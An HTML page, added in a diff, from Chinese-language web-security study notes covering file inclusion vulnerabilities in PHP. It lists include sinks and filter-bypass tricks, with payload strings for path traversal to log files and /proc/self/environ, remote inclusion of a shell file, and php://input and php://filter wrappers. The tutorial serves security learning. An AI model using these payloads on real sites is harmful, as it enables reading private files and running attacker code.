@@ -1,0 +1,341 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>4.9. 文件包含 &mdash; Web安全学习笔记 1.0 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+  <script type="text/javascript" src="../_static/js/modernizr.min.js"></script>
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
+        <script src="../_static/jquery.js"></script>
+        <script src="../_static/underscore.js"></script>
+        <script src="../_static/doctools.js"></script>
+        <script src="../_static/language_data.js"></script>
+    
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+
+    
+
+  
+  <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="4.10. XXE" href="xxe.html" />
+    <link rel="prev" title="4.8. 文件上传" href="fileupload.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> Web安全学习笔记
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">内容索引:</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../basic/index.html">1. 序章</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../network/index.html">2. 计算机网络与协议</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../info/index.html">3. 信息收集</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="index.html">4. 常见漏洞攻防</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="sql/index.html">4.1. SQL注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xss/index.html">4.2. XSS</a></li>
+<li class="toctree-l2"><a class="reference internal" href="csrf.html">4.3. CSRF</a></li>
+<li class="toctree-l2"><a class="reference internal" href="ssrf.html">4.4. SSRF</a></li>
+<li class="toctree-l2"><a class="reference internal" href="cmdinjection.html">4.5. 命令注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="pathtraversal.html">4.6. 目录穿越</a></li>
+<li class="toctree-l2"><a class="reference internal" href="fileread.html">4.7. 文件读取</a></li>
+<li class="toctree-l2"><a class="reference internal" href="fileupload.html">4.8. 文件上传</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">4.9. 文件包含</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#id2">4.9.1. 基础</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#sink">4.9.2. 触发Sink</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id3">4.9.3. 绕过技巧</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#url">4.9.3.1. url编码绕过</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id4">4.9.3.2. 特殊字符绕过</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id5">4.9.3.3. %00截断</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id6">4.9.3.4. 长度截断</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id7">4.9.3.5. 伪协议绕过</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id8">4.9.4. 参考链接</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="xxe.html">4.10. XXE</a></li>
+<li class="toctree-l2"><a class="reference internal" href="ssti.html">4.11. 模版注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xpath.html">4.12. Xpath注入</a></li>
+<li class="toctree-l2"><a class="reference internal" href="logic.html">4.13. 逻辑漏洞 / 业务漏洞</a></li>
+<li class="toctree-l2"><a class="reference internal" href="config.html">4.14. 配置安全</a></li>
+<li class="toctree-l2"><a class="reference internal" href="middleware/index.html">4.15. 中间件</a></li>
+<li class="toctree-l2"><a class="reference internal" href="webcache.html">4.16. Web Cache欺骗攻击</a></li>
+<li class="toctree-l2"><a class="reference internal" href="httpSmuggling.html">4.17. HTTP 请求走私</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../language/index.html">5. 语言与框架</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../intranet/index.html">6. 内网渗透</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../defense/index.html">7. 防御技术</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../auth/index.html">8. 认证机制</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../tools/index.html">9. 工具与资源</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../manual/index.html">10. 手册速查</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/index.html">11. 其他</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">Web安全学习笔记</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="index.html"><span class="section-number">4. </span>常见漏洞攻防</a> &raquo;</li>
+        
+      <li><span class="section-number">4.9. </span>文件包含</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/vuln/fileinclude.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="id1">
+<h1><span class="section-number">4.9. </span>文件包含<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="id2">
+<h2><span class="section-number">4.9.1. </span>基础<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h2>
+<p>常见的文件包含漏洞的形式为 <code class="docutils literal notranslate"><span class="pre">&lt;?php</span> <span class="pre">include(&quot;inc/&quot;</span> <span class="pre">.</span> <span class="pre">$_GET['file']);</span> <span class="pre">?&gt;</span></code></p>
+<p>考虑常用的几种包含方式为</p>
+<ul class="simple">
+<li><p>同目录包含 <code class="docutils literal notranslate"><span class="pre">file=.htaccess</span></code></p></li>
+<li><p>目录遍历 <code class="docutils literal notranslate"><span class="pre">?file=../../../../../../../../../var/lib/locate.db</span></code></p></li>
+<li><p>日志注入 <code class="docutils literal notranslate"><span class="pre">?file=../../../../../../../../../var/log/apache/error.log</span></code></p></li>
+<li><p>利用 <code class="docutils literal notranslate"><span class="pre">/proc/self/environ</span></code></p></li>
+</ul>
+<p>其中日志可以使用SSH日志或者Web日志等多种日志来源测试</p>
+</div>
+<div class="section" id="sink">
+<h2><span class="section-number">4.9.2. </span>触发Sink<a class="headerlink" href="#sink" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><dl class="simple">
+<dt>PHP</dt><dd><ul>
+<li><dl class="simple">
+<dt>include</dt><dd><ul>
+<li><p>在包含过程中出错会报错，不影响执行后续语句</p></li>
+</ul>
+</dd>
+</dl>
+</li>
+<li><dl class="simple">
+<dt>include_once</dt><dd><ul>
+<li><p>仅包含一次</p></li>
+</ul>
+</dd>
+</dl>
+</li>
+<li><dl class="simple">
+<dt>require</dt><dd><ul>
+<li><p>在包含过程中出错，就会直接退出，不执行后续语句</p></li>
+</ul>
+</dd>
+</dl>
+</li>
+<li><p>require_once</p></li>
+</ul>
+</dd>
+</dl>
+</li>
+</ul>
+</div>
+<div class="section" id="id3">
+<h2><span class="section-number">4.9.3. </span>绕过技巧<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h2>
+<p>常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式</p>
+<div class="section" id="url">
+<h3><span class="section-number">4.9.3.1. </span>url编码绕过<a class="headerlink" href="#url" title="Permalink to this headline">¶</a></h3>
+<p>如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过</p>
+</div>
+<div class="section" id="id4">
+<h3><span class="section-number">4.9.3.2. </span>特殊字符绕过<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li><p>某些情况下，读文件支持使用Shell通配符，如 <code class="docutils literal notranslate"><span class="pre">?</span></code> <code class="docutils literal notranslate"><span class="pre">*</span></code> 等</p></li>
+<li><p>url中 使用 <code class="docutils literal notranslate"><span class="pre">?</span></code> <code class="docutils literal notranslate"><span class="pre">#</span></code> 可能会影响include包含的结果</p></li>
+<li><p>某些情况下，unicode编码不同但是字形相近的字符有同一个效果</p></li>
+</ul>
+</div>
+<div class="section" id="id5">
+<h3><span class="section-number">4.9.3.3. </span>%00截断<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h3>
+<p>几乎是最常用的方法，条件是magic_quotes_gpc打开，而且php版本小于5.3.4。</p>
+</div>
+<div class="section" id="id6">
+<h3><span class="section-number">4.9.3.4. </span>长度截断<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h3>
+<p>Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。</p>
+<p>msdn定义 <code class="docutils literal notranslate"><span class="pre">#define</span> <span class="pre">MAX_PATH</span> <span class="pre">260</span></code>，其中第260个字符为字符串结尾的 <code class="docutils literal notranslate"><span class="pre">\0</span></code> ，而linux可以用getconf来判断文件名长度限制和文件路径长度限制。</p>
+<p>获取最长文件路径长度：getconf PATH_MAX /root 得到4096
+获取最长文件名：getconf NAME_MAX /root 得到255</p>
+<p>那么在长度有限的时候，<code class="docutils literal notranslate"><span class="pre">././././</span></code> (n个) 的形式就可以通过这个把路径爆掉</p>
+<p>在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8</p>
+</div>
+<div class="section" id="id7">
+<h3><span class="section-number">4.9.3.5. </span>伪协议绕过<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li><p>远程包含: 要求 <code class="docutils literal notranslate"><span class="pre">allow_url_fopen=On</span></code> 且 <code class="docutils literal notranslate"><span class="pre">allow_url_include=On</span></code> ， payload为 <code class="docutils literal notranslate"><span class="pre">?file=[http|https|ftp]://websec.wordpress.com/shell.txt</span></code> 的形式</p></li>
+<li><p>PHP input: 把payload放在POST参数中作为包含的文件，要求 <code class="docutils literal notranslate"><span class="pre">allow_url_include=On</span></code> ，payload为 <code class="docutils literal notranslate"><span class="pre">?file=php://input</span></code> 的形式</p></li>
+<li><p>Base64: 使用Base64伪协议读取文件，payload为 <code class="docutils literal notranslate"><span class="pre">?file=php://filter/convert.base64-encode/resource=index.php</span></code> 的形式</p></li>
+<li><p>data: 使用data伪协议读取文件，payload为 <code class="docutils literal notranslate"><span class="pre">?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</span></code> 的形式，要求 <code class="docutils literal notranslate"><span class="pre">allow_url_include=On</span></code></p></li>
+</ul>
+</div>
+</div>
+<div class="section" id="id8">
+<h2><span class="section-number">4.9.4. </span>参考链接<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.cdxy.me/?p=752">Exploit with PHP Protocols</a></p></li>
+<li><p><a class="reference external" href="https://highon.coffee/blog/lfi-cheat-sheet/">lfi cheat sheet</a></p></li>
+</ul>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="xxe.html" class="btn btn-neutral float-right" title="4.10. XXE" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="fileupload.html" class="btn btn-neutral float-left" title="4.8. 文件上传" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2019, Lyle
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
